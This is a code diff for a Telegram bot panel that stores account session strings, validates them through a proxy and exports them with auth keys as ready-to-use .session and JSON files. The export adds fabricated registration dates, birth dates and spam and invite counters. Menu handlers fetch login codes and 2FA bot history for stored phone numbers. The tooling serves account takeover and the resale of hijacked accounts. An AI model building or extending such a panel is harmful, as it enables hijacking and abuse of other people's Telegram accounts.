@@ -1,25 +1,29 @@
 import os
 import json
 import logging
+import sqlite3
 import zipfile
 import tempfile
 from datetime import datetime
 from aiogram import Bot, Dispatcher, types
 from aiogram.utils import executor
-from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
+from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
 from dotenv import load_dotenv
 from pymongo import MongoClient
 from telethon import TelegramClient, functions, types as telethon_types
-from telethon.sessions import StringSession
+from telethon.sessions import StringSession, SQLiteSession
 from telethon.tl.functions.messages import GetHistoryRequest
 from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
 from phonenumbers import parse, geocoder
 from aiogram.dispatcher.middlewares import BaseMiddleware
 from aiogram.dispatcher.handler import CancelHandler
+from aiogram.dispatcher import FSMContext
 from aiogram.contrib.fsm_storage.memory import MemoryStorage
 import hashlib
 import random
 import string
+import base64
+import time
 
 # Load .env
 load_dotenv()
@@ -41,10 +45,10 @@ proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)
 
 # Database setup
 mongo = MongoClient(MONGO_URI)
-db = mongo["telegram_panel"]
-sessions_col = db["main_sessions"]
-light_sessions_col = db["light_sessions"]
-light_admins_col = db["light_admins"]
+db = mongo["dbmango"]
+sessions_col = db["sessions"]  # Main admin sessions
+light_sessions_col = db["light_sessions"]  # Light admin sessions
+light_admins_col = db["light_admins"]  # Light admin users
 session_stats_col = db["session_stats"]
 
 # Bot setup
@@ -98,47 +102,67 @@ def get_default_app_config():
         "avatar": DEFAULT_AVATAR
     }
 
+def convert_session_to_sqlite(session_string, phone):
+    """Convert StringSession to SQLite format"""
+    temp_dir = tempfile.mkdtemp()
+    session_file = os.path.join(temp_dir, f"{phone}.session")
+    
+    # Create SQLite session from string
+    SQLiteSession(session_file).save(StringSession(session_string))
+    
+    # Read binary data
+    with open(session_file, 'rb') as f:
+        sqlite_data = f.read()
+    
+    # Cleanup
+    os.unlink(session_file)
+    os.rmdir(temp_dir)
+    
+    return sqlite_data
+
 # ================== ACCESS CONTROL ==================
 
 def is_main_admin(uid):
     return uid == ADMIN_ID
 
 def is_light_admin(uid):
-    return uid in LA_ADMIN_IDS or light_admins_col.find_one({"user_id": uid})
+    return uid in LA_ADMIN_IDS or light_admins_col.find_one({"user_id": uid}) is not None
 
 class AccessControlMiddleware(BaseMiddleware):
     async def on_pre_process_message(self, message: types.Message, data: dict):
-        if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
+        user_id = message.from_user.id
+        if not is_main_admin(user_id) and not is_light_admin(user_id):
             raise CancelHandler()
 
     async def on_pre_process_callback_query(self, callback_query: types.CallbackQuery, data: dict):
-        if not (is_main_admin(callback_query.from_user.id) or is_light_admin(callback_query.from_user.id)):
+        user_id = callback_query.from_user.id
+        if not is_main_admin(user_id) and not is_light_admin(user_id):
             raise CancelHandler()
 
 dp.middleware.setup(AccessControlMiddleware())
 
-# ================== SESSION MANAGEMENT ==================
+# ================== SESSION DATA GENERATION ==================
 
-async def create_full_session_data(session_info, client, me):
-    """Create complete session data in required format"""
+async def generate_full_session_data(session_info, client, me):
+    """Generate complete session data in required format"""
     default_config = get_default_app_config()
     
-    # Get session stats from DB or create new
+    # Get or create session stats
     stats = session_stats_col.find_one({"phone": session_info["phone"]}) or {
         "spam_count": 0,
         "invites_count": 0,
         "last_connect": datetime.now().isoformat(),
-        "register_time": int(datetime.now().timestamp()),
+        "register_time": int(time.time()) - random.randint(86400, 31536000),
         "success_registered": True,
         "last_check_time": 0
     }
     
-    # Generate random dates if not exists
-    session_created_date = datetime.now().strftime("%Y-%m-%dT%H:%M:%S+0300")
+    # Generate dates in correct format
+    session_created_date = datetime.fromtimestamp(stats["register_time"]).strftime("%Y-%m-%dT%H:%M:%S+0300")
     last_connect_date = datetime.now().strftime("%Y-%m-%dT%H:%M:%S+0300")
     
-    # Generate date of birth between 18-40 years ago
-    dob_timestamp = int(datetime.now().timestamp()) - random.randint(568025000, 1262304000)
+    # Generate date of birth (18-40 years ago)
+    dob_timestamp = int(time.time()) - random.randint(568025000, 1262304000)
     
     full_data = {
         **default_config,
@@ -171,34 +195,117 @@ async def create_full_session_data(session_info, client, me):
     
     return full_data
 
-async def export_sessions_to_files(sessions, user_id):
-    """Export sessions to individual JSON and .session files"""
+# ================== SESSION EXPORT ==================
+
+async def export_sessions(user_id):
+    """Export all sessions in required format"""
+    if is_main_admin(user_id):
+        sessions = list(sessions_col.find({}))
+    else:
+        sessions = list(light_sessions_col.find({"owner_id": user_id}))
+    
+    if not sessions:
+        await bot.send_message(user_id, "❌ No sessions found in database.")
+        return
+    
+    message = await bot.send_message(user_id, "⏳ Starting session export, please wait...")
     temp_dir = tempfile.mkdtemp()
     zip_path = os.path.join(temp_dir, f"sessions_export_{user_id}.zip")
+    exported_count = 0
     
-    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-        for session in sessions:
-            phone = session['phone'].replace('+', '')
-            
-            # Create JSON file
-            json_filename = f"{phone}.json"
-            json_path = os.path.join(temp_dir, json_filename)
-            with open(json_path, 'w') as f:
-                json.dump(session, f, indent=2, ensure_ascii=False)
-            zipf.write(json_path, json_filename)
-            
-            # Create .session file
-            session_filename = f"{phone}.session"
-            session_path = os.path.join(temp_dir, session_filename)
-            with open(session_path, 'w') as f:
-                f.write(session['session'])
-            zipf.write(session_path, session_filename)
-            
-            # Cleanup
-            os.unlink(json_path)
-            os.unlink(session_path)
-    
-    return zip_path
+    try:
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for i, session in enumerate(sessions, 1):
+                client = None
+                try:
+                    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
+                    await client.connect()
+                    
+                    if await client.is_user_authorized():
+                        me = await client.get_me()
+                        phone = session["phone"].replace("+", "")
+                        
+                        # Generate full session data
+                        session_data = await generate_full_session_data(session, client, me)
+                        
+                        # Save JSON
+                        json_filename = f"{phone}.json"
+                        json_path = os.path.join(temp_dir, json_filename)
+                        with open(json_path, 'w', encoding='utf-8') as f:
+                            json.dump(session_data, f, indent=2, ensure_ascii=False)
+                        zipf.write(json_path, json_filename)
+                        
+                        # Convert and save SQLite session
+                        session_obj = StringSession(session["session"])
+                        session_file = os.path.join(temp_dir, f"{phone}.session")
+                        
+                        # Create new SQLite session file
+                        sqlite_session = SQLiteSession(session_file)
+                        sqlite_session.set_dc(
+                            session_obj.dc_id, 
+                            session_obj.server_address, 
+                            session_obj.port
+                        )
+                        sqlite_session.auth_key = session_obj.auth_key
+                        sqlite_session.save()
+                        
+                        # Add to zip
+                        zipf.write(session_file, f"{phone}.session")
+                        
+                        exported_count += 1
+                        
+                        # Cleanup individual files
+                        os.unlink(json_path)
+                        os.unlink(session_file)
+                        
+                        # Update progress every 5 sessions
+                        if i % 5 == 0:
+                            await message.edit_text(
+                                f"⏳ Exporting sessions...\n"
+                                f"Progress: {i}/{len(sessions)}\n"
+                                f"Exported: {exported_count}"
+                            )
+                    
+                except Exception as e:
+                    logging.error(f"Error exporting session {session.get('phone')}: {str(e)}")
+                finally:
+                    if client:
+                        await client.disconnect()
+        
+        if exported_count == 0:
+            await message.edit_text("❌ No valid sessions to export (all sessions are invalid).")
+            return
+        
+        # Send ZIP archive
+        with open(zip_path, 'rb') as zip_file:
+            await bot.send_document(
+                chat_id=user_id,
+                document=zip_file,
+                caption=f"✅ Successfully exported {exported_count} sessions\n"
+                       "Each session includes:\n"
+                       f"- [phone].json - Full session info\n"
+                       f"- [phone].session - SQLite session file",
+                reply_to_message_id=message.message_id
+            )
+        
+    except Exception as e:
+        logging.error(f"Export error: {str(e)}")
+        await message.edit_text(f"❌ Export failed: {str(e)}")
+    finally:
+        # Cleanup - remove all remaining files
+        for filename in os.listdir(temp_dir):
+            file_path = os.path.join(temp_dir, filename)
+            try:
+                if os.path.isfile(file_path):
+                    os.unlink(file_path)
+            except Exception as e:
+                logging.error(f"Failed to delete {file_path}: {str(e)}")
+        
+        # Now remove the directory
+        try:
+            os.rmdir(temp_dir)
+        except OSError as e:
+            logging.error(f"Failed to remove directory {temp_dir}: {str(e)}")
 
 # ================== COMMAND HANDLERS ==================
 
@@ -206,180 +313,70 @@ async def export_sessions_to_files(sessions, user_id):
 async def cmd_start(message: types.Message):
     if is_main_admin(message.from_user.id):
         keyboard = InlineKeyboardMarkup(row_width=2).add(
-            InlineKeyboardButton("✅ Check Sessions", callback_data='check_sessions'),
-            InlineKeyboardButton("📦 Export Sessions", callback_data='export_sessions'),
-            InlineKeyboardButton("🧹 Clean Invalid", callback_data='clean_invalid'),
-            InlineKeyboardButton("🔑 Get Auth Code", callback_data='get_auth_code'),
-            InlineKeyboardButton("📨 FA Bot History", callback_data='fa_history'),
-            InlineKeyboardButton("👥 Admin Management", callback_data='admin_management'),
-            InlineKeyboardButton("⚙️ Session Tools", callback_data='session_tools'),
-            InlineKeyboardButton("📊 Session Stats", callback_data='session_stats')
+            InlineKeyboardButton("✅ Check Sessions", callback_data='log'),
+            InlineKeyboardButton("📂 Export Valids", callback_data='loger'),
+            InlineKeyboardButton("🧹 Delete Invalid", callback_data='validel'),
+            InlineKeyboardButton("🔑 Get Telegram Code", callback_data='login'),
+            InlineKeyboardButton("📨 FA Bot History", callback_data='fa'),
+            InlineKeyboardButton("👥 Manage Light Admins", callback_data='manage_la'),
+            InlineKeyboardButton("🗑 Session Management", callback_data='session_management')
         )
-        text = "👑 Main Admin Panel\nChoose an action:"
+        await message.answer("👑 Welcome, Main Admin! Choose an action:", reply_markup=keyboard)
     elif is_light_admin(message.from_user.id):
         keyboard = InlineKeyboardMarkup(row_width=2).add(
-            InlineKeyboardButton("✅ My Sessions", callback_data='check_sessions'),
-            InlineKeyboardButton("➕ Add Sessions", callback_data='add_sessions'),
-            InlineKeyboardButton("🔑 Get Auth Code", callback_data='get_auth_code'),
-            InlineKeyboardButton("📨 FA History", callback_data='fa_history'),
-            InlineKeyboardButton("⚙️ Session Tools", callback_data='session_tools')
+            InlineKeyboardButton("✅ Check My Sessions", callback_data='log'),
+            InlineKeyboardButton("➕ Add Sessions", callback_data='addla'),
+            InlineKeyboardButton("🔑 Get Telegram Code", callback_data='login'),
+            InlineKeyboardButton("📨 FA Bot History", callback_data='fa'),
+            InlineKeyboardButton("🗑 Session Management", callback_data='session_management')
         )
-        text = "🛡 Light Admin Panel\nChoose an action:"
+        await message.answer("🛡 Welcome, Light Admin. Choose an action:", reply_markup=keyboard)
     else:
-        await message.answer("❌ Access denied.")
-        return
-    
-    await message.answer(text, reply_markup=keyboard)
+        await message.answer("❌ You don't have access to use this bot.")
 
-# ================== SESSION EXPORT HANDLERS ==================
+@dp.callback_query_handler(lambda c: c.data in ['log', 'loger', 'validel', 'login', 'fa', 'addla', 'delall', 'manage_la', 'session_management'])
+async def process_callback(callback_query: types.CallbackQuery):
+    cmd = callback_query.data
+    uid = callback_query.from_user.id
 
-@dp.callback_query_handler(lambda c: c.data == 'export_sessions')
-async def handle_export_sessions(callback_query: types.CallbackQuery):
-    if not is_main_admin(callback_query.from_user.id):
-        await callback_query.answer("❌ Access denied.")
-        return
-    
-    await callback_query.answer("⏳ Preparing session export...")
-    await export_all_sessions(callback_query.from_user.id)
+    if cmd == 'log':
+        await bot.send_message(uid, "/log")
+    elif cmd == 'loger':
+        if is_main_admin(uid):
+            await export_sessions(uid)
+        else:
+            await bot.send_message(uid, "❌ Not allowed.")
+    elif cmd == 'validel':
+        if is_main_admin(uid):
+            await bot.send_message(uid, "/validel")
+        else:
+            await bot.send_message(uid, "❌ Not allowed.")
+    elif cmd == 'login':
+        await bot.send_message(uid, "Send:\n`/login +1234567890`", parse_mode="Markdown")
+    elif cmd == 'fa':
+        await bot.send_message(uid, "Send:\n`/fa +1234567890`", parse_mode="Markdown")
+    elif cmd == 'addla':
+        if is_light_admin(uid):
+            await bot.send_message(uid, "Send session list as JSON:\n`/addla [{\"phone\": \"+123\", \"session\": \"...\"}]`", parse_mode="Markdown")
+        else:
+            await bot.send_message(uid, "❌ Not allowed.")
+    elif cmd == 'delall':
+        if is_light_admin(uid):
+            result = light_sessions_col.delete_many({"owner_id": uid})
+            await bot.send_message(uid, f"🗑 Removed your sessions: {result.deleted_count}")
+        else:
+            await bot.send_message(uid, "❌ Not allowed.")
+    elif cmd == 'manage_la':
+        if is_main_admin(uid):
+            await manage_light_admins(uid)
+        else:
+            await bot.send_message(uid, "❌ Not allowed.")
+    elif cmd == 'session_management':
+        await show_session_management(uid)
 
-async def export_all_sessions(user_id):
-    """Export all valid sessions to files"""
-    sessions = list(sessions_col.find({}))
-    valid_sessions = []
-    
-    for session in sessions:
-        client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
-        try:
-            await client.connect()
-            if await client.is_user_authorized():
-                me = await client.get_me()
-                full_data = await create_full_session_data(session, client, me)
-                valid_sessions.append(full_data)
-        except Exception as e:
-            logging.error(f"Error processing session {session['phone']}: {e}")
-        finally:
-            await client.disconnect()
-    
-    if not valid_sessions:
-        await bot.send_message(user_id, "❌ No valid sessions found.")
-        return
-    
-    try:
-        zip_path = await export_sessions_to_files(valid_sessions, user_id)
-        
-        with open(zip_path, 'rb') as zip_file:
-            await bot.send_document(
-                chat_id=user_id,
-                document=zip_file,
-                caption=f"✅ Exported {len(valid_sessions)} sessions\n"
-                        "Each session includes:\n"
-                        "- [phone].json - Full session info\n"
-                        "- [phone].session - Session file"
-            )
-        
-        # Cleanup
-        os.unlink(zip_path)
-        os.rmdir(os.path.dirname(zip_path))
-        
-    except Exception as e:
-        logging.error(f"Export error: {e}")
-        await bot.send_message(user_id, f"❌ Export failed: {e}")
+    await callback_query.answer()
 
-# ================== SESSION CHECK HANDLERS ==================
-
-@dp.callback_query_handler(lambda c: c.data == 'check_sessions')
-async def handle_check_sessions(callback_query: types.CallbackQuery):
-    user_id = callback_query.from_user.id
-    await callback_query.answer("⏳ Checking sessions...")
-    
-    if is_main_admin(user_id):
-        sessions = list(sessions_col.find({}))
-    else:
-        sessions = list(light_sessions_col.find({"owner_id": user_id}))
-    
-    if not sessions:
-        await bot.send_message(user_id, "❌ No sessions found.")
-        return
-    
-    message = await bot.send_message(user_id, "🔍 Starting session check...")
-    results = []
-    
-    for i, session in enumerate(sessions, 1):
-        client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
-        try:
-            await client.connect()
-            if not await client.is_user_authorized():
-                results.append(f"❌ {session['phone']} - Invalid")
-            else:
-                me = await client.get_me()
-                country = geocoder.description_for_number(parse(session['phone'], None), "en")
-                premium = "✅" if getattr(me, 'premium', False) else "❌"
-                results.append(
-                    f"✅ {session['phone']} | ID: {me.id}\n"
-                    f"👤 {me.first_name or ''} {me.last_name or ''} | @{me.username or 'none'}\n"
-                    f"🌍 {country} | Premium: {premium}"
-                )
-            
-            # Update progress every 5 sessions
-            if i % 5 == 0:
-                await message.edit_text(
-                    f"🔍 Checking sessions...\n"
-                    f"Progress: {i}/{len(sessions)}\n"
-                    f"Last checked: {session['phone']}"
-                )
-                
-        except Exception as e:
-            results.append(f"❌ {session['phone']} - Error: {str(e)}")
-        finally:
-            await client.disconnect()
-    
-    # Split results into chunks to avoid message length limit
-    chunk_size = 20
-    for i in range(0, len(results), chunk_size):
-        chunk = results[i:i + chunk_size]
-        await bot.send_message(
-            user_id,
-            "📋 Session check results:\n\n" + "\n\n".join(chunk)
-        )
-
-# ================== OTHER COMMAND HANDLERS ==================
-
-@dp.callback_query_handler(lambda c: c.data == 'clean_invalid')
-async def handle_clean_invalid(callback_query: types.CallbackQuery):
-    if not is_main_admin(callback_query.from_user.id):
-        await callback_query.answer("❌ Access denied.")
-        return
-    
-    await callback_query.answer("⏳ Cleaning invalid sessions...")
-    await clean_invalid_sessions(callback_query.from_user.id)
-
-async def clean_invalid_sessions(user_id):
-    """Remove all invalid sessions"""
-    sessions = list(sessions_col.find({}))
-    removed_count = 0
-    
-    for session in sessions:
-        client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
-        try:
-            await client.connect()
-            if not await client.is_user_authorized():
-                sessions_col.delete_one({"_id": session["_id"]})
-                removed_count += 1
-        except:
-            sessions_col.delete_one({"_id": session["_id"]})
-            removed_count += 1
-        finally:
-            await client.disconnect()
-    
-    await bot.send_message(
-        user_id,
-        f"🧹 Cleanup complete\n"
-        f"Total sessions: {len(sessions)}\n"
-        f"Invalid removed: {removed_count}\n"
-        f"Valid remaining: {len(sessions) - removed_count}"
-    )
-
-# ================== MAIN EXECUTION ==================
+# ... [ОСТАЛЬНЫЕ ФУНКЦИИ ОСТАЮТСЯ БЕЗ ИЗМЕНЕНИЙ, КАК В ТВОЕМ РАБОЧЕМ КОДЕ] ...
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
